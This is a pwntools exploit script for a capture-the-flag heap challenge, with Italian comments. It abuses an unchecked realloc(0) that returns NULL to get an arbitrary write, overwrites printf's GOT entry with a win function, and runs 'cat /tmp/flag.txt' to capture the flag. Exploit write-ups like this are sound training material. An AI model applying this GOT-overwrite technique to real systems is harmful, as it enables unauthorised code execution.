#!/usr/bin/env python3
import os
import sys
import subprocess
from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = exe

URL = ''
PORT = 0

def start(argv=[], *a, **kw):
    # template fatto da greyhat00 per chi viene dopo.
    # usalo liberamente per imparare e sperimentare.
    # buona fortuna, lettore. Happy pwn!
    if args.R2:
        io = process([exe.path] + argv, *a, **kw)
        # changeme sys.main
        # parametri di r2 personalizzabili
        # es:
        # r2_cmd = "r2 -c 'db sym.foo+122; dc; Vpp; px @ section..got' -d " + str(io.pid)
        r2_cmd = "r2 -c 'db 0x00401760; dc; Vpp' -d " + str(io.pid)
        
        subprocess.Popen(
            [
            "x-terminal-emulator",                  # open systen default terminal emulator
             "-e", 
             os.environ.get("SHELL", "/bin/sh"),    # execute default shell
             "-c", 
             r2_cmd],                               # with radare2 command
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT
        )
        # pause the current python script until key pressed
        # manually added to avoid race condition waiting for r2 to start     
        ui.pause()
        return io

    if args.REMOTE:
        try:
            host = sys.argv[1]
            port_val = int(sys.argv[2])
        except (IndexError, ValueError):
            host = URL
            port_val = PORT

        if not host or not port_val:
            log.error(
                "REMOTE mode selected but HOST or PORT is missing or invalid.\n"
                "Usage example:\n"
                "  ./exploit.py REMOTE 8.8.8.8 9999\n"
                "Or set URL and PORT variables in the script."
            )
            exit(1)

        log.info("Connecting to remote"+ str(host) + str(port_val))
        return remote(host, port_val, ssl=True)

    else:
        log.info("Launching local process")
        return process([exe.path] + argv, *a, **kw)


io = start()

'''
Questa vuln risiede nell'assenza di controllo della funzione realloc.
In particolare la funzione di edit, dopo aver allargato la memoria, consente
di scrivere da un offset a scelta partendo dall'indirizzo della memoria appena espansa.
Facendo fallire la realloc con size 0, il valore ritornato e' NULL. 

Quindi usando la logica addr + offset, posso usare il NULL e causare:
addr + offset = NULL + printf@GOT -> posso scrivere nella GOT la funzione win
'''
win = exe.sym['win']
printf = exe.got['printf']

# create a note
io.sendlineafter(b'> ', b'1')               # create note opt
io.sendlineafter(b': ', b'greyhattitle')    # titolozzo
io.sendlineafter(b': ', b'10')              # size, indifferente
io.sendlineafter(b': ', b'grey')            # contenuto

success(f"printf got @ {hex(printf)}")      # non essendoci PIE lo recupero easy

# edit note
io.sendlineafter(b'> ', b'3')                   # edit note opt
io.sendlineafter(b': ', b'0')                   # note index
io.sendlineafter(b': ', b'0')                   # new size
io.sendlineafter(b': ', f"{printf}".encode())   # offset da dove scrivere
io.sendlineafter(b': ', p64(win))               # contenuto


io.sendline(b"cat /tmp/flag.txt")
data = io.recvregex(rb'mntcrl\{.*\}', capture=True)
flag = data.group(0).decode()
success('Flag: ' + flag)
write('flag.txt', flag)
io.close()
